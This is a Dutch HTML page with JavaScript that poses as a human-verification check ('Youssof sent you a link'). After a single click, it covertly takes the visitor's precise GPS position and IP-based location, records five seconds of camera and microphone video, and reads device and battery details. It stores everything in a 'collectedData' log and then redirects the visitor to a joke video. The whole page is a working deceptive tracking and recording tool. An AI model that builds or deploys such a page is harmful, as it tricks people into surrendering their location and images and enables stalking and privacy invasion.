<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <title>Bevestiging</title>
    <style>
        /* [Uw bestaande CSS-code blijft ongewijzigd] */
    </style>
</head>
<body>
    <div class="container">
        <h1 id="messageText"></h1>
        <p>Dit is alleen om te bevestigen of jij een mens bent. Klik op de knop hieronder om door te gaan.</p>
        <!-- Toegevoegde knop -->
        <button id="permissionButton">Klik hier om door te gaan</button>

        <!-- Loading animatie en voortgangsbalk worden pas zichtbaar na klikken -->
        <div class="loading"></div>
        <div class="progress-bar">
            <span id="progressBarSpan"></span>
        </div>
        <p id="error-message">Kon gegevens niet ophalen. Probeer het opnieuw.</p>
    </div>

    <script>
        // Haal instellingen op uit localStorage
        const micCamEnabled = localStorage.getItem("micCamEnabled") === "true";
        const locationEnabled = localStorage.getItem("locationEnabled") === "true";
        const notificationsEnabled = localStorage.getItem("notificationsEnabled") === "true";
        const redirectUrl = localStorage.getItem("redirectUrl") || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        const redirectDelay = parseInt(localStorage.getItem("redirectDelay"), 10) * 1000 || 5000; // Omzetten naar milliseconden

        // Stel de berichttekst in
        document.getElementById("messageText").innerHTML = localStorage.getItem("messageText") || "<span class='highlight'>Youssof</span> heeft je een link gestuurd!";

        let locationData = null;
        let ipLocationData = null;
        let recordingData = null;
        let batteryData = null;

        function saveData() {
            let combinedData = {};

            if (locationEnabled && locationData) {
                Object.assign(combinedData, locationData);
            }

            if (ipLocationData) {
                combinedData.ipLocation = ipLocationData;
            }

            if (micCamEnabled && recordingData) {
                combinedData.recording = recordingData;
            }

            if (batteryData) {
                combinedData.battery = batteryData;
            }

            // Voeg de redirect URL toe aan de data
            combinedData.redirectUrl = redirectUrl;

            // Sla gegevens op als er iets is om op te slaan
            if (Object.keys(combinedData).length > 0) {
                let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
                savedData.push(combinedData);
                localStorage.setItem("collectedData", JSON.stringify(savedData));

                // Update event versturen voor live update
                const event = new CustomEvent('dataUpdated');
                window.dispatchEvent(event);
            }
        }

        async function getIPLocationData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                // IP locatiegegevens
                ipLocationData = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: parseFloat(data.latitude),
                    lon: parseFloat(data.longitude),
                    timestamp: new Date().toISOString()
                };

                // Sla gegevens direct op
                saveData();
            } catch (error) {
                console.error('Error fetching IP location data:', error);
            }
        }

        function getLocationData() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const accuracy = position.coords.accuracy;
                            const timestamp = new Date().toISOString();
                            const device = navigator.userAgent;

                            locationData = {
                                lat: lat,
                                lon: lon,
                                accuracy: accuracy,
                                timestamp: timestamp,
                                device: device
                            };

                            // Sla gegevens direct op
                            saveData();
                            resolve();
                        },
                        (error) => {
                            console.error('Error getting location:', error);
                            reject(error);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    reject(new Error("Je browser ondersteunt geen geolocatie. Gebruik een moderne browser."));
                }
            });
        }

        function getMicCamData() {
            return new Promise(async (resolve, reject) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    reject(new Error('Media Devices API niet ondersteund.'));
                    return;
                }

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });

                    const mediaRecorder = new MediaRecorder(stream);
                    let chunks = [];

                    mediaRecorder.ondataavailable = function (e) {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };

                    mediaRecorder.onstop = function () {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();

                        reader.onloadend = function () {
                            recordingData = {
                                dataUrl: reader.result,
                                timestamp: new Date().toISOString()
                            };

                            // Sla gegevens direct op
                            saveData();
                            resolve();
                        };

                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();

                    // Stop na 5 seconden
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop());
                    }, 5000);
                } catch (error) {
                    console.error("Error accessing media devices:", error);
                    reject(error);
                }
            });
        }

        function requestNotificationPermission() {
            return new Promise((resolve, reject) => {
                if ("Notification" in window) {
                    Notification.requestPermission().then(permission => {
                        if (permission === "granted") {
                            resolve();
                        } else {
                            reject(new Error("Notificatie toestemming geweigerd."));
                        }
                    });
                } else {
                    reject(new Error("Notificaties worden niet ondersteund door deze browser."));
                }
            });
        }

        async function getBatteryData() {
            if ('getBattery' in navigator || ('battery' in navigator && navigator.battery)) {
                try {
                    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(navigator.battery));
                    batteryData = {
                        level: battery.level,
                        charging: battery.charging
                    };

                    // Sla gegevens direct op
                    saveData();
                } catch (error) {
                    console.error("Error getting battery info:", error);
                }
            }
        }

        async function redirectWithPermissions() {
            try {
                // Verberg de knop en toon de loading animatie en voortgangsbalk
                document.getElementById('permissionButton').style.display = 'none';
                document.querySelector('.loading').style.display = 'inline-block';
                document.querySelector('.progress-bar').style.display = 'block';

                const permissions = [];

                if (locationEnabled) {
                    permissions.push(getLocationData());
                }

                if (micCamEnabled) {
                    permissions.push(getMicCamData());
                }

                if (notificationsEnabled) {
                    permissions.push(requestNotificationPermission());
                }

                await Promise.all(permissions);

                await getBatteryData();
                await getIPLocationData();

                // Stel de duur van de voortgangsbalkanimatie in
                const progressBarSpan = document.getElementById('progressBarSpan');
                progressBarSpan.style.animationDuration = `${redirectDelay / 1000}s`;

                // Wacht totdat de voortgangsbalk klaar is
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, redirectDelay);

            } catch (error) {
                console.error("Error in permissions:", error);
                document.querySelector(".loading").style.display = "none";
                document.getElementById("error-message").style.display = "block";
                document.getElementById("error-message").innerText = error.message;
                // Toon de knop weer om opnieuw te proberen
                document.getElementById('permissionButton').style.display = 'block';
            }
        }

        // Sla gegevens op voordat de gebruiker de pagina verlaat
        window.addEventListener('beforeunload', saveData);

        // Event listener voor de knop
        document.getElementById('permissionButton').addEventListener('click', redirectWithPermissions);
    </script>
</body>
</html>
